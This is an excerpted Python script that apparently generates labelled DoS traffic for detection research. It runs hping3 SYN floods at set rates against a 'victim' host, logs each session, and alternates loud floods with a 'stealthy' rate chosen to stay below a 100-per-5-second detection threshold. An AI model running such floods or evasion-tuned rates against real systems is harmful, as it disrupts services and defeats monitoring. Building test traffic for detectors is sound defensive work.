#!/usr/bin/env python3
"""
Volumetric DoS attack script - Phase 1, Category 3.
Runs hping3 SYN floods against the victim at controlled rates.
Logs each session via attack_logger.py.
"""
import subprocess
import time
import sys
...
CLOUD = "aws"
FLOOD_DURATION = 10  # seconds per flood session
MAX_ATTACK_SECONDS = FLOOD_DURATION + 20  # safety margin
...
def run_dos(session_num, attack_type, hping_rate_flag, severity):
    ...
    try:
        ...
        print(f"[{session_id}] TIMED OUT unexpectedly")
        ...
        log_attack_session(
            ...
            attack_category="dos_volumetric",
            tool="hping3",
            command=command,
            start_ts=start_ts,
            end_ts=end_ts,
...
if __name__ == "__main__":
    ...
    for i in range(1, num_sessions + 1):
        if i % 3 == 0:
            # Stealthy: gentler rate, below our 100/5s threshold if sustained evenly
            run_dos(i, "stealthy_dos", "-i u1000", "stealthy")
        else:
            # Loud: proven clean detection rate
            run_dos(i, "loud_dos", "-i u500", "loud")
        time.sleep(65)  # keep >60s gap, consistent with our established pattern
